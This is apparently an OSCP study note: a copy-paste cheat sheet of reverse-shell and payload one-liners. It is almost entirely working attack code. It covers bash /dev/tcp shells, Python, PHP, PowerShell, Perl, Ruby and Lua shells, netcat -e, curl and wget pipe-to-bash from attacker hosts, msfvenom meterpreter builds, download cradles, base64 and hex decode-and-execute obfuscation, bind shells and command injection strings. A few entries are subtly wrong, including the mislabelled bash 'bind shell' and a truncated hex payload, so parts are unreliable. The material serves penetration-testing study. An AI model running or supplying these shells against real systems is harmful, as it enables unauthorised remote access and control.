---
tags: [oscp, payloads, shells, reverse-shell]
aliases: [Reverse Shells, Payloads, Shell One-Liners]
category: Linux
difficulty: ★★☆☆☆
last-updated: 2025-04-30
---

# 💀 Shells & Payloads

> [!info] Quick Reference
> Copy-paste ready reverse shells for instant access. Keep this open during exploitation.

---

## 🎯 How to Use This Guide

1. **Set up listener on your Kali machine:**
   ```bash
   nc -lvnp 4444
   # or
   rlwrap nc -lvnp 4444
   ```

2. **Pick a shell below** matching your target's environment

3. **Paste into target** (via RCE, command injection, etc.)

4. **Get reverse shell back** on your listener

---

## 🐚 Bash Reverse Shells

### Classic Bash Reverse Shell

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### Bash One-Liner (URL Encoded)

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
```

### Bash with Exec

```bash
exec 1<>/dev/tcp/ATTACKER_IP/4444;exec 0<&1;/bin/bash -i 2>&1
```

### Bash using /dev/tcp (Works on Most Linux)

```bash
/bin/bash -i > /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

## 🐍 Python Reverse Shells

### Python 2

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

### Python 3

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

### Python - Cleaner (Multi-line)

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.10.10",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")
```

### Python - Using pty (Best Quality Shell)

```python
python3 -c 'import pty,socket,subprocess;s=socket.socket();s.connect(("10.10.10.10",4444));subprocess.call(["sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno());'
```

---

## 📄 PHP Reverse Shells

### PHP Simple (<?php ?>)

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'"); ?>
```

### PHP Using system()

```php
<?php system("nc 10.10.10.10 4444 -e /bin/bash"); ?>
```

### PHP Using passthru()

```php
<?php passthru("bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"); ?>
```

### PHP One-Liner

```php
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

---

## 💻 PowerShell Reverse Shells (Windows)

### PowerShell One-Liner

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$buf = 0..65535|%{0};while(($i = $stream.Read($buf, 0, $buf.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buf,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### PowerShell Shorter Version

```powershell
$ip='10.10.10.10';$port=4444;$c=New-Object Net.Sockets.TCPClient('10.10.10.10',$port);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$s.Write(([Text.Encoding]::ASCII).GetBytes($o),0,$o.Length)}$c.Close()
```

### PowerShell Using nishang (Best)

```powershell
# Download from: https://github.com/samratashok/nishang
# Invoke-PowerShellTcp.ps1

. .\Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444
```

---

## 🔌 Netcat Reverse Shells

### Netcat (if nc available)

```bash
nc -e /bin/bash ATTACKER_IP 4444
```

### Netcat Alternative (older systems)

```bash
/bin/bash | nc ATTACKER_IP 4444
```

### Netcat with -i (Interactive)

```bash
nc ATTACKER_IP 4444 -e /bin/bash
```

---

## 🐚 sh (Shell) Reverse Shells

### sh - Simple

```sh
sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### sh - Using exec

```sh
exec 1<>/dev/tcp/10.10.10.10/4444;exec 0<&1;/bin/sh -i 2>&1
```

---

## 🦀 Perl Reverse Shells

### Perl Simple

```perl
perl -e 'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}; '
```

### Perl One-Liner

```perl
perl -MIO::Socket -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.10.10:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

---

## 🐟 Ruby Reverse Shells

### Ruby Simple

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.10.10","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Ruby More Stable

```ruby
ruby -e 'require"socket";exit if fork;s=TCPSocket.new("10.10.10.10","4444");loop{system(gets.chomp)}while s.gets'
```

---

## 🦎 Lua Reverse Shells

### Lua Simple

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.10.10','4444');os.execute('/bin/sh -i <&3 >&3 2>&3')"
```

---

## 🎪 Java Reverse Shells

### Java (if jar available)

```java
java -jar ysoserial.jar CommonsCollections5 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' | nc ATTACKER_IP 4444
```

---

## 🌐 Web-Based Payloads

### cURL (if system can curl)

```bash
curl http://attacker.com/shell.sh | bash
```

### wget (if system can wget)

```bash
wget http://attacker.com/shell.sh -O- | bash
```

### Wget with Pipe

```bash
wget -O - http://10.10.10.10:8080/shell.sh | bash
```

---

## 🚀 MSFvenom Payloads

### Generate Linux x86 ELF

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

### Generate Linux x64 ELF

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

### Generate Windows x86 EXE

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
```

### Generate Windows x64 EXE

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
```

### Generate as Base64 (for encoding)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
base64 -w0 shell.exe
```

---

## 🎯 Multi-Stage Payloads

### Download + Execute (Linux)

```bash
wget http://10.10.10.10/shell.elf && chmod +x shell.elf && ./shell.elf
```

### Download + Execute (Windows)

```powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.10.10/shell.exe','C:\Temp\shell.exe');C:\Temp\shell.exe
```

### PowerShell Download Cradle

```powershell
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1')"
```

---

## 🛡️ Payload Obfuscation

### Base64 Encoding (Bash)

```bash
# Create payload
echo "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" | base64

# Decode + execute
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjEK" | base64 -d | bash
```

### URL Encoding

```bash
# Use online encoder or:
python3 -c "import urllib.parse; print(urllib.parse.quote('bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'))"
```

### Hex Encoding

```bash
# Create payload
echo "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" | xxd -p

# Decode + execute
echo "6261736820202d6920... " | xxd -r -p | bash
```

---

## 🔧 Shell Stabilization

**After you get reverse shell:**

```bash
# 1. Upgrade to interactive PTY
python -c 'import pty; pty.spawn("/bin/bash")'
# or
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Fix terminal for Ctrl+C, etc
export TERM=xterm

# 3. Background job suspension
ctrl-z              # Suspend
stty raw -echo      # Set terminal to raw mode
fg                  # Resume in foreground

# 4. Full setup (one command)
python -c 'import pty; pty.spawn("/bin/bash")' && export TERM=xterm
```

---

## 📊 Payload Selection Chart

| Language | Availability | Complexity | Stability | Use When |
|----------|---|---|---|---|
| Bash | Very High | Low | High | Linux, default |
| Python | High | Low | High | Python installed |
| PHP | Medium | Low | Medium | Web shells |
| PowerShell | High (Win) | Medium | High | Windows |
| Perl | High | Medium | Medium | Alternative Linux |
| nc | Medium | Very Low | Low | Quick/test |

---

## 💡 Tips & Tricks

> [!tip] Always Test Locally First
> Test your payload on a local Linux/Windows VM before using in exam.

> [!tip] Have Multiple Options
> Know at least 3 different payloads for each OS. One may fail due to filters.

> [!tip] Filter Bypass
> If bash is filtered, try: `sh`, `dash`, `ksh`, `csh`, `zsh`

> [!tip] No Network Access?
> Use [[#Interactive Shell Upgrade|shell upgrade]] to make TTY interactive for local enumeration.

> [!danger] Firewall Blocking
> If reverse shell fails, try:
> - Different ports (443, 80, 53)
> - Different protocols (UDP, ICMP, DNS)
> - Bind shell instead (listen on target)

---

## 🔙 Bind Shells (If Reverse Fails)

### Bash Bind Shell

```bash
# On target:
bash -i >& /dev/tcp/0.0.0.0/4444 0>&1

# On attacker:
nc TARGET_IP 4444
```

### Netcat Bind Shell

```bash
# On target:
nc -lvnp 4444 -e /bin/bash

# On attacker:
nc TARGET_IP 4444
```

---

## 📝 Command Injection Test Strings

Use these to test for RCE vulnerabilities:

```bash
; id ;
| id |
& id &
` id `
$( id )
|| id ||
&& whoami &&
```

---

**Related Notes:**
- [[01-Methodology/Pentest-Methodology|🗺️ Pentest Methodology]]
- [[02-Linux/Linux-Privesc|🐧 Linux Privilege Escalation]]
- [[05-Tools/MSFvenom-Payloads|💣 MSFvenom Payloads]]

---
